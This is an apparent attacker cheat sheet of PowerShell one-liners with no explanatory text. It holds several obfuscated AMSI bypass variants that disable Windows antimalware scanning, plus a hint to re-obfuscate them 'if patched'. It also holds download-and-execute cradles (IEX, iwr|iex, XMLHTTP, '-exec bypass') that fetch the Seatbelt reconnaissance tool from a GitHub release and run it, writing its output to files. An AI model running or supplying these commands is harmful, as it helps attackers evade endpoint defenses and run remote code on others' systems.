[Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)
Sleep '2'
i`w`R -uRI "" -OutFiLe $env:LOCALAPPDATA\WeAreSeatbelt.exe
Sleep
$env:LOCALAPPDATA\WeAreSeatbelt.exe > C:\OUTPUT.txt

wr;IEX (New-Object Net.Webclient).downloadstring("https://github.com/Calvindd2f/Seatbelt/releases/download/Binary/Seatbelt.exe") ; .\Seatbelt.exe > .\ass.txt
$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','https://github.com/Calvindd2f/Seatbelt/releases/download/Binary/Seatbelt.exe',$false);$h.send();iex $h.responseText

powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('https://github.com/Calvindd2f/Seatbelt/releases/download/Binary/Seatbelt.exe')|iex"


[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('s_amsiInitFailed','NonPublic,Static').SetValue($null,$true)
# Lol at "https://github.com/PowerShell/PowerShell/issues/2906"

[Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|ForEach-Object{[char]([convert]::toint16($_,16))}|ForEach-Object{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|ForEach-Object{[char]([convert]::toint16($_,16))}|ForEach-Object{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)


# Other-Multiline Bypass
$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils';$assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u));$field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static');$field.SetValue($null,$true)


# Other - if patched change strings or vars
 S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
